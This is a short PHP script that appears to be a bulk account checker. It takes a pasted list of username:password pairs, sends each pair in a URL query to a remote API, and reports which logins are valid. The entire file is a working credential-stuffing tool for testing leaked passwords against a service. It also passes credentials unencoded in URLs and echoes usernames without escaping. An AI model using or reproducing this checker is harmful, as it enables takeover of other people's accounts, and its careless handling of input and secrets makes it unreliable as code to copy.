<?php
include("site.php");
$acc= $_POST['acc'];

function get_content($bas, $son, $yazi)
{
	@preg_match_all('/' . preg_quote($bas, '/') .
	'(.*?)'. preg_quote($son, '/').'/i', $yazi, $m);
	return @$m[1];
}
$arr = explode("\n", $acc);

if(empty($acc)){
	echo "<div class='alert alert-warning'><b>Fill in all fields !</b></div>";
	}else{
	
echo "<div class='alert alert-info'><b>";
foreach($arr as $row){
$cut= explode(":", $row);
$u= $cut[0];
$p= $cut[1];

$go_api = file_get_contents("$site/api/?u=$u&p=$p");
$get_data = get_content("<b>", "</b>", $go_api);
$json= $get_data['0'];
$data = json_decode($json);
$err= $data->errorContext;
$ju= $data->username;


if(empty($err)){
	echo "<p class='text-success'>$u | $ju | VALID</p>";
}else{
	echo "<p class='text-danger'>$u | INVALID</p>";
	}


}
echo "</b></div>";
}
?>